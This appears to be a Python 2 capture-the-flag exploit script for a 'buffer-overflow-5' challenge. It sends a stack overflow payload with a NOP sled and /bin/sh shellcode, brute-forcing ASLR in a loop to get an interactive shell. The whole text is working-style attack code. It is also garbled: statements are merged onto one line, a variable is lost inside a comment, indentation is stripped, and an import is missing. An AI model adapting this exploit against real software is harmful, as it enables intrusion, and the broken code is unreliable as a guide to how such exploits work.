import struct, sys, time
from subprocess import PIPE, Popen
from os import execve
from struct import pack
from platform import machine
from subprocess import Popen, PIPE, STDOUT
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e \x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
bufsize = 156
offset = 4 #incl. saved ebp nopsize = 4096
def prep_buffer(addr_buffer):
buf = "A" * (bufsize+offset)
buf += struct.pack("<I",(addr_buffer+bufsize+offset+4)) buf += "\x90" * nopsize
buf += shellcode
return buf
def brute_aslr(buf):
#p = Popen(['./bof', buf]).wait()
p = process(['/problems/buffer-overflow-5_11/./vuln']) p.sendline(buf)
p.interactive()
p.close()
if __name__ == '__main__': addr_buffer = 0xfb000008 i= 0
while True:
# randomly decided
print i
buf = prep_buffer(addr_buffer) brute_aslr(buf)
i += 1
addr_buffer+=4096